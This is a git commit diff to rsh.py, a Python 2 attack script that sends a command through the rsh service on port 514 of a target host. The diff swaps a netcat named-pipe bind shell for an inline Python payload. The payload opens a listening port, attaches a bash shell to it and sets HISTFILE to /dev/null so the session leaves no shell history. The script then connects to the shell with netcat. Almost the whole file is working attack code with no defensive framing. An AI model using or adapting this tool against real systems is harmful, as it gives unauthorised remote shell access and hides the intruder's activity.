c4169ffa36a97c6c40760059a36be855964efcbd
Charlie Dean <dean.charlie07@gmail.com>
2015-07-28 16:20:31 +0100

    Completely remove the rsh and replace with python bind shell

--- rsh.py
+++ rsh.py
@@ -1,21 +1,21 @@
 #!/usr/bin/python2.7
-#Rsh Module
+#Rsh Bind Shell Module
 import sys
 import socket
 import random
 import time
 import subprocess
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-if len(sys.argv) < 5:
+if len(sys.argv) < 4:
     print "exiting"
     print "Example ./rsh.py 10.129.121.16 foobar foobar id"
-
     sys.exit()
 else:
     host = sys.argv[1]
     fromuser = sys.argv[2]
     username = sys.argv[3]
-    command = sys.argv[4]
+    command = ""
+
 SEND="%s\0%s\0%s\0" % (fromuser, username, command)
 
 startport = 600
@@ -26,30 +26,28 @@ startbindport = 5000
 endbindport = 6000
 bindport =  random.randrange(startbindport, endbindport)
 
-print "Using Port %s" %(myport)
-s.bind(('0.0.0.0', myport))
-s.connect((host,514))
-s.send("\0")
-s.send(SEND)
-time.sleep(0.5)
-test = s.recv(1024)
-print test
-s.close()
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+payload1 = 'python -c "import os,pty,socket;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)'
+payload2 = ';s.bind((\'0.0.0.0\', %s));s.listen(1);(rem, addr) = s.accept();'%(bindport)
+payload3 = 'os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);'
+payload4 = 'os.putenv(\'HISTFILE\',\'/dev/null\');pty.spawn(\'/bin/bash\');s.close()"'
+PAYLOAD = payload1 + payload2 + payload3 +payload4
+
 user = raw_input('Do You Want A Bind Shell? y/n: ')
 
 if user.lower() =="y":
     s.bind(('0.0.0.0', myport))
     s.connect((host,514))
-    command  = 'mknod /tmp/backpipe p ; /bin/bash 0</tmp/backpipe | nc -nlvp %s 1>/tmp/backpipe'% (bindport)
+    command  = PAYLOAD
     SEND="%s\0%s\0%s\0" % (fromuser, username, command)
     s.send("\0")
     s.send(SEND)
     time.sleep(0.5)
     test = s.recv(1024)
     s.close()
-    subprocess.call(["nc" , str(host), str(bindport)])
-    print 'Using Netcat To Connect To %s On Port %s'% (host, bindport)
+    print 'Using Netcat To Connect To %s On Port %s'% (host, str(bindport))
+    print 'Type Exit Into The Shell To Shut Down The Bind Port'
+    subprocess.call(['nc' , str(host), str(bindport)])
+    s.close()
 else:
     s.close()
     sys.exit()
